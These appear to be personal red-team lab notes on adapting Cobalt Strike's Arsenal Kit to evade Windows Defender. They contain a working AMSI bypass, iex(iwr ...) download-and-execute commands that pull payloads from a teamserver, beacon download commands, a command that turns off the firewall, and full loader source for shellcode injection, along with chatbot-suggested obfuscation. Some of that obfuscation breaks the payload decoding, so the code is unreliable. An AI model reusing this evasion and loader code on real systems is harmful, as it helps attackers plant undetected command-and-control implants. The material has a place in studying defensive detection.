class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);
```
worked
![[Pasted image 20250129201546.png]]
going to mod `compress.ps1` with this
- what it looks like in `vim`
![[Pasted image 20250129201734.png]]
rebuilding `kit`
```bash
┌──(root💀gobots)-[30Jan2025 01:17:22]-[/opt/cobaltstrike_testing/arsenal-kit]
└─# ./build_arsenal_kit.sh                                                                    
```
payload
```bash
iex(iwr http://192.168.179.129:80/thegreatest -useb)
```
grabbed it just not executing
![[Pasted image 20250129202311.png]]
looking in wireshark
- the amsi bypass is working but why is my payload not executing
![[Pasted image 20250129202618.png]]
navigating to the webpage shows only the `amsi` not any payloads attached to it
![[Pasted image 20250129202927.png]]
going to revert the `compress.ps1` again and identify what is being sent with the original `compress.ps1` its not attaching the payloads

what is looks like with the original `compress.ps1`
- so we need to add the `%%DATA%%
```bash
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();  
```
![[Pasted image 20250129203751.png]]
so according to `chatgpt` `compress.ps1` is not only for `amsi bypass` but can include an `amsi bypass` as well
notes for me
```bash
# AMSI Bypass
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);

# Decompress and Execute Payload
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
what i am going to put into `compress.ps1`
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
![[Pasted image 20250129204712.png]]
now what it looks like
![[Pasted image 20250129204936.png]]
blocked my `amsi`
![[Pasted image 20250129205130.png]]
![[Pasted image 20250129205255.png]]
going to revert the vm and try again

```bash
PS C:\Windows\system32> iex(iwr http://192.168.179.129:80/hahahaha -useb)                                               
iex : At line:1 char:1                                                                                                  
+ class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}                                                     
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                     
+ This script contains malicious content and has been blocked by your antivirus software.                                 
+ At line:1 char:1                                                                                                        
+ iex(iwr http://192.168.179.129:80/hahahaha -useb)                                                                     
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                         
+ CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException                                          
+ FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand  
```
reverting vm - turning off firewalls
#### RESOURCE KIT WORKING
what we used for our `compress.ps1`
```bash
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} );$peaches=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($peaches,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
what i am going to use for `compress.ps1`
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
disabling defender and firewall
```bash
netsh advfirewall set allprofiles state off
```
what `compress.ps1` looks like
![[Pasted image 20250129211218.png]]
worked! `compress.ps1` is good
```bash
iex(iwr http://192.168.179.129/great -useb) 
```
![[Pasted image 20250129214549.png]]
for the `resource` kit

---

now for the `artifact kit`
im able to pull over the `artifact` but its not properly executing
![[Pasted image 20250129220148.png]]
changing `patch.c` back to original
```bash
for (int i = 0; i < length; i++) {
    char* a = (char *)ptr + i;
    char* b = (char *)buffer + i;
    GetTickCount();
    *a = *b ^ key[i % 8];
}

```
fixed
![[Pasted image 20250129220605.png]]
rebuilding `arsenal kit`
pulling over file with this wget
```bash
PS C:\Users\blaster\Desktop\malware> wget http://192.168.179.129:8000/artifact64.exe -UseBasicP -OutFile "C:\Users\blaster\Desktop\malware\artifact64.exe"     

http://192.168.179.129:80/testing
```
gocheck
![[Pasted image 20250129221514.png]]
bad bytes
```bash
89 c3 39 f7 7e 1c ff 15  b5 bd 00 00 48 89 f0 83 
e0 07 41 8a 04 04 32 44  35 00 88 04 33 48 ff c6
```
first set of bytes
![[Pasted image 20250129221827.png]]
2nd set of bytes
![[Pasted image 20250129221919.png]]
have to modify `patch.c` back 

original getting flagged
![[Pasted image 20250129222047.png]]
modified `patch.c`

```c
// Modified decryption logic
 for (int i = 0; i < length; i++) {
     char* a = (char *)ptr + i;
     char* b = (char *)buffer + i;

     // Dynamic key generation using current time and random values
     srand((unsigned int)GetTickCount()); // Seed with current time
     char dynamicKey = (char)(rand() % 256); // Generate a random key per byte
        
     // Introduce time-based obfuscation
     DWORD tickDiff = GetTickCount() % 256;
     *a = *b ^ (dynamicKey ^ tickDiff); // XOR with dynamic key and time-based modification
   }
```

![[Pasted image 20250129222147.png]]
save and rebuild artifact kit


reboot `cobalt` reload the new `arsenal kit`
![[Pasted image 20250129222431.png]]
make `http` listeners
![[Pasted image 20250129222458.png]]
pull over new artifacts to see if `defender` triggers them
![[Pasted image 20250129222559.png]]
no threat detected, looks good
![[Pasted image 20250129222805.png]]
making new payloads and placing in `/home/kali/malware`
![[Pasted image 20250129222849.png]]
crashed..
![[Pasted image 20250129222919.png]]
cobalt setup

```bash
──(root💀gobots)-[29Jan2025 00:49:35]-[/opt/cobaltstrike_testing/cobaltstrike/server]
./teamserver 192.168.179.129 passphrase /opt/cobaltstrike_testing/custom-cobalt/Profiles/custom.profile
```

generated payloads again
![[Pasted image 20250129223805.png]]
generated
pulling over to the desktop
![[Pasted image 20250129223910.png]]
hosting file
![[Pasted image 20250129224115.png]]
```bash
wget http://192.168.179.129/muahaha -UseBasicP -OutFile "C:\Users\blaster\Desktop\cheese.exe"
```
successfully transferred the file 
![[Pasted image 20250129225038.png]]
executed but not catching a beacon
![[Pasted image 20250129225320.png]]

changing `artifact_kit_config` to indirect like in grows notes
![[Pasted image 20250129230206.png]]
changing `bypass-pipe.c`

```bash
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnotrt-svc\\optev%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int) (GetTickCount() % 9898));
```
rebuilding `arsenal_kit`
![[Pasted image 20250129230523.png]]



```bash
wget http://192.168.179.129/haha -UseBasicP -OutFile "C:\Users\blaster\Desktop\cheese2.exe"
```

```bash
wget http://192.168.179.129:8000/artifact64.exe -UseBasicP -OutFile "C:\Users\blaster\Desktop\malware\artifact64.exe" 
```
not a clean file, need to chase the bits back down
![[Pasted image 20250129234041.png]]
bad bytes
```bash
00000000  31 d2 41 89 d0 42 80 3c  01 00 74 16 41 89 c1 46  |1.A..B.<..t.A..F|                                                                                   00000010  0f b7 04 01 ff c2 41 c1  c9 08 45 01 c8 44 31 c0  |......A...E..D1.|   
```
first line
![[Pasted image 20250129234347.png]]
2nd is the same

changing `bypass-pipe.c` back to this 
```bash
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnotrt-svc\\noptev", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```
original line `36` to 59

```bash
void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (int z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;
        GetTickCount();
        *a = *b ^ key[z % 8];
    }

    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;
        GetTickCount();
        *a = *b ^ key[z % 8];
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
}
```
chatgpt modified
```bash
void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;
    volatile int dummy = 0;  // Dummy variable for obfuscation

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (int z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;

        // Introduce randomness and time-based obfuscation
        DWORD tickCount = GetTickCount() ^ (z * 31); // XOR with z for added randomness
        srand((unsigned int)tickCount);  // Seed rand with modified time
        char dynamicKey = (char)(rand() % 256); // Generate random key
        
        *a = *b ^ (dynamicKey ^ (tickCount % 256)); // XOR with dynamic key + time variation

        dummy ^= tickCount;  // Meaningless operation to confuse analysis
    }

    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;

        // Add more time-based randomness and obfuscation
        DWORD tickCount = GetTickCount() ^ (z * 17); // XOR with z and modify time-based value
        srand((unsigned int)tickCount);  // Re-seed rand for further variation
        char dynamicKey = (char)(rand() % 256); // Generate new random key for each byte

        *a = *b ^ (dynamicKey ^ (tickCount % 256)); // XOR with dynamic key + time variation

        dummy ^= tickCount * 5;  // Additional dummy operation to confuse analysis
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
    
    dummy ^= dummy * dummy;  // Final dummy operation to further obfuscate the code
}

```
patch.c full
```bash
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
    phear * payload = (phear *)data;

    /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
       the payload directly. */
    if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
        return;

    void * gpa_addr = (void *)GetProcAddress;
    void * gmh_addr = (void *)GetModuleHandleA;

    memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
    memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"

void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;
    volatile int dummy = 0;  // Dummy variable for obfuscation

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (int z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;

        // Introduce randomness and time-based obfuscation
        DWORD tickCount = GetTickCount() ^ (z * 31); // XOR with z for added randomness
        srand((unsigned int)tickCount);  // Seed rand with modified time
        char dynamicKey = (char)(rand() % 256); // Generate random key
        
        *a = *b ^ (dynamicKey ^ (tickCount % 256)); // XOR with dynamic key + time variation

        dummy ^= tickCount;  // Meaningless operation to confuse analysis
    }

    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;

        // Add more time-based randomness and obfuscation
        DWORD tickCount = GetTickCount() ^ (z * 17); // XOR with z and modify time-based value
        srand((unsigned int)tickCount);  // Re-seed rand for further variation
        char dynamicKey = (char)(rand() % 256); // Generate new random key for each byte

        *a = *b ^ (dynamicKey ^ (tickCount % 256)); // XOR with dynamic key + time variation

        dummy ^= tickCount * 5;  // Additional dummy operation to confuse analysis
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
    
    dummy ^= dummy * dummy;  // Final dummy operation to further obfuscate the code
}


#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
    void (*function)();
    function = (void (*)())buffer;
#if STACK_SPOOF == 1
    beacon_threadid = GetCurrentThreadId();
#endif
    function();
}

void spawn(void * buffer, int length, char * key) {
    void * ptr = NULL;

    /* This memory allocation will be released by beacon for these conditions:
     *    1. The stage.cleanup is set to true
     *    2. The reflective loader passes the address of the loader into DllMain.
     *
     * This is true for the built-in Cobalt Strike reflective loader and the example
     * user defined reflective loader (UDRL) in the Arsenal Kit.
     */
#if USE_HeapAlloc
    /* Create Heap */
    HANDLE heap;
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

    /* allocate the memory for our decoded payload */
    ptr = HeapAlloc(heap, 0, 10);

    /* Get wacky and add a bit of of HeapReAlloc */
    if (length > 0) {
        ptr = HeapReAlloc(heap, 0, ptr, length);
    }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
    SIZE_T size = length;
    NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
    ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
    SIZE_T size = length;
    HANDLE hFile = create_file_mapping(0, length);
    ptr = map_view_of_file(hFile);
    NtClose(hFile);
#else
    HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
    ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    CloseHandle(hFile);
#endif
#endif

// Modified decryption logic
 for (int i = 0; i < length; i++) {
     char* a = (char *)ptr + i;
     char* b = (char *)buffer + i;

     // Dynamic key generation using current time and random values
     srand((unsigned int)GetTickCount()); // Seed with current time
     char dynamicKey = (char)(rand() % 256); // Generate a random key per byte
        
     // Introduce time-based obfuscation
     DWORD tickDiff = GetTickCount() % 256;
     *a = *b ^ (dynamicKey ^ tickDiff); // XOR with dynamic key and time-based modification
   }


#if STACK_SPOOF == 1
    /* setup stack spoofing */
    set_stack_spoof_code();
#endif

    /* propagate our key function pointers to our payload */
    set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
    /* fix memory protection */
    DWORD old;
#if USE_SYSCALLS == 1
    NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
    VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

    /* spawn a thread with our data */
#if USE_SYSCALLS == 1
    HANDLE thandle;
    NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif
```
chatgpt's full obfuscated

```bash
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char dta[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void s3t_k3y_p0int3rs(void * bffr) {
    phear * pl0ad = (phear *)dta;

    if (pl0ad->gmh_offset <= 0 || pl0ad->gpa_offset <= 0)
        return;

    void * gpa_addr = (void *)GetProcAddress;
    void * gmh_addr = (void *)GetModuleHandleA;

    memcpy(bffr + pl0ad->gmh_offset, &gmh_addr, sizeof(void *));
    memcpy(bffr + pl0ad->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"

void sp4wn(void * bffr, int l3ngth, char * k3y) {
    char pr0c3ss[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;
    volatile int dummY = 0;  // Extra variable for chaos

    for (int z = 0; z < sizeof(pr0c3ss); z++) {
        char* a = (char *)pr0c3ss + z;
        char* b = (char *)pr0c3ss + z;

        DWORD t1ckC0unt = GetTickCount() ^ (z * 33); // XOR with z + more randomness
        srand((unsigned int)t1ckC0unt);  // Chaos with srand
        char dynKey = (char)(rand() % 256); // Randomize key
        
        *a = *b ^ (dynKey ^ (t1ckC0unt % 256)); // XOR magic

        dummY ^= t1ckC0unt;  // Further obfuscation
    }

    for (z = 0; z < l3ngth; z++) {
        char* a = (char *)bffr + z;
        char* b = (char *)bffr + z;

        DWORD t1ckC0unt = GetTickCount() ^ (z * 7); // More XOR craziness
        srand((unsigned int)t1ckC0unt);
        char dynKey = (char)(rand() % 256);
        
        *a = *b ^ (dynKey ^ (t1ckC0unt % 256)); // XOR madness

        dummY ^= t1ckC0unt * 5;  // Extra pointless operation
    }

    s3t_k3y_p0int3rs(bffr);
    inject(bffr, l3ngth, pr0c3ss);
    
    dummY ^= dummY * dummY;  // Final chaotic operation
}

#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * bffr) {
    void (*fnctn)();
    fnctn = (void (*)())bffr;
#if STACK_SPOOF == 1
    beacon_threadid = GetCurrentThreadId();
#endif
    fnctn();
}

void sp4wn(void * bffr, int l3ngth, char * k3y) {
    void * ptr = NULL;

#if USE_HeapAlloc
    HANDLE h3ap;
    h3ap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    ptr = HeapAlloc(h3ap, 0, 10);

    if (l3ngth > 0) {
        ptr = HeapReAlloc(h3ap, 0, ptr, l3ngth);
    }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
    SIZE_T sz = l3ngth;
    NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
    ptr = VirtualAlloc(0, l3ngth, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
    SIZE_T sz = l3ngth;
    HANDLE hFile = create_file_mapping(0, l3ngth);
    ptr = map_view_of_file(hFile);
    NtClose(hFile);
#else
    HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, l3ngth, NULL);
    ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    CloseHandle(hFile);
#endif
#endif

// Modified decryption logic
    for (int i = 0; i < l3ngth; i++) {
        char* a = (char *)ptr + i;
        char* b = (char *)bffr + i;

        srand((unsigned int)GetTickCount()); // Introduce entropy
        char dynKey = (char)(rand() % 256); // New random key
        
        DWORD t1ckDiff = GetTickCount() % 256;
        *a = *b ^ (dynKey ^ t1ckDiff); // XOR with dynamic key and time diff
    }

#if STACK_SPOOF == 1
    set_stack_spoof_code();
#endif

    s3t_k3y_p0int3rs(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
    DWORD old;
#if USE_SYSCALLS == 1
    NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &sz, PAGE_EXECUTE_READ, &old);
#else
    VirtualProtect(ptr, l3ngth, PAGE_EXECUTE_READ, &old);
#endif
#endif

#if USE_SYSCALLS == 1
    HANDLE thndle;
    NtCreateThreadEx(&thndle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif

```


just restarted with original `patch.c` i think i fucked something up
![[Pasted image 20250130002523.png]]
bad bytes
```bash
[!] Isolated bad bytes at offset 0x8FF in the original file [approximately 2303 / 48128 bytes]                                                                    00000000  00 31 c0 48 8b 4c 24 68  39 c3 7e 16 48 89 c2 83  |.1.H.L$h9.~.H...|                                                                                    00000010  e2 07 41 8a 54 15 00 32  14 07 88 14 01 48 ff c0  |..A.T..2.....H..|                                                                                                                                                                                                                          
```
1st hex
![[Pasted image 20250130002804.png]]
ok line 114 to 116 have to change

![[Pasted image 20250130002927.png]]
original line 114-116
```bash
   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {
      *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
   }
```
`chatgpt` change
```bash
/* decode the payload with the key */
for (int i = 0; i < length; i++) {
    // Introduce randomness and more XOR operations
    unsigned int randomOffset = (unsigned int)((i * 0x1F1F1F1F) ^ (GetTickCount() & 0xFFFFF)) % 8; // Introduce randomness based on the tick count and index
    char dynamicKey = key[randomOffset]; // Select a random key based on the offset

    // Obfuscate further with some meaningless operations
    char obfuscatedBuffer = *((char *)buffer + i) ^ dynamicKey;
    obfuscatedBuffer = obfuscatedBuffer + (i % 3);  // Add small variations to confuse analysis
    *((char *)ptr + i) = obfuscatedBuffer ^ ((i * 0x2A) % 255); // Apply a secondary XOR operation based on the index

    // More dummy operations to confuse static analysis
    volatile int dummy = (i ^ randomOffset) * 42;  // Meaningless operation
    dummy ^= (dummy >> 1);  // Further dummy operation
}
```

![[Pasted image 20250130003233.png]]
new bad bytes

```bash
[!] Isolated bad bytes at offset 0x11C5 in the original file [approximately 4549 / 48128 bytes]                                                                   00000000  31 d2 41 89 d0 42 80 3c  01 00 74 16 41 89 c1 46  |1.A..B.<..t.A..F|                                                                                     00000010  0f b7 04 01 ff c2 41 c1  c9 08 45 01 c8 44 31 c0  |......A...E..D1.|   
```
![[Pasted image 20250130003440.png]]
i think i have to change this line because its referenced in grows notes
![[Pasted image 20250130004152.png]]
original notes
![[Pasted image 20250130004626.png]]
```bash
void spawn(void * buffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++) {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }

   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
      *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];  // 8 byte XoR
   }

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
```
grows notes for line 36
```bash
void spawn(void *buffer, int length, char *key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (z = 0; z < sizeof(process); z++) {
        char *a = (char *)process + z;
        char *b = (char *)process + z;

        // Call GetTickCount() (though not used in this logic)
        GetTickCount();

        // XOR the process name with the key
        *a = *b ^ key[z % 8];
    }

    /* decode the payload with the key */
